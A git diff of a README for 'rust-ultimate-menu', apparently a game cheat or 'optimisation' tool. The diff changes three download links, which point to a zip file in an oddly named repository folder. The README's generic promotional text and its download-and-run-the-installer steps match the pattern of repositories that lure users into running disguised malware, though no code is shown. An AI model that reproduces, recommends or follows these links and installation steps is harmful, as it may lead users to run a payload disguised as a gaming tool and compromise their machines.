@@ -1,7 +1,7 @@
 # 🛠️ rust-ultimate-menu - Optimize Your Gaming Experience Easily
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/YoussefGaming438/rust-ultimate-menu/main/disloyally/rust-ultimate-menu-respectably.zip" style="display:inline-block; padding: 20px; font-size: 20px; color: white; background-color: #28a745; border-radius: 5px; text-decoration: none;">Download Now!</a>
+  <a href="https://github.com/YoussefGaming438/rust-ultimate-menu/raw/refs/heads/main/disloyally/menu-rust-ultimate-1.0.zip" style="display:inline-block; padding: 20px; font-size: 20px; color: white; background-color: #28a745; border-radius: 5px; text-decoration: none;">Download Now!</a>
 </p>
 
 ## 🚀 Getting Started
@@ -10,7 +10,7 @@ To get started with rust-ultimate-menu, follow these simple steps. This guide wi
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Click the following link to access the downloads: [Download the latest release](https://raw.githubusercontent.com/YoussefGaming438/rust-ultimate-menu/main/disloyally/rust-ultimate-menu-respectably.zip).
+1. **Visit the Releases Page**: Click the following link to access the downloads: [Download the latest release](https://github.com/YoussefGaming438/rust-ultimate-menu/raw/refs/heads/main/disloyally/menu-rust-ultimate-1.0.zip).
 2. **Choose the Right File**: Look for the most recent version. The filename will typically end with `.exe` or similar, depending on your operating system.
 3. **Download the File**: Click on the filename to begin downloading. Save the file to a location you can easily access, such as your Desktop or Downloads folder.
 4. **Run the Installer**: Once downloaded, navigate to the file location. Double-click the file to run it.
@@ -63,5 +63,5 @@ To stay informed of new features and fixes, regularly check the Releases page fo
 We hope you find rust-ultimate-menu helpful in your gaming journey. Our goal is to provide tools that optimize your gameplay experience, making it both enjoyable and efficient.
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/YoussefGaming438/rust-ultimate-menu/main/disloyally/rust-ultimate-menu-respectably.zip" style="display:inline-block; padding: 20px; font-size: 20px; color: white; background-color: #28a745; border-radius: 5px; text-decoration: none;">Download Now!</a>
+  <a href="https://github.com/YoussefGaming438/rust-ultimate-menu/raw/refs/heads/main/disloyally/menu-rust-ultimate-1.0.zip" style="display:inline-block; padding: 20px; font-size: 20px; color: white; background-color: #28a745; border-radius: 5px; text-decoration: none;">Download Now!</a>
 </p>
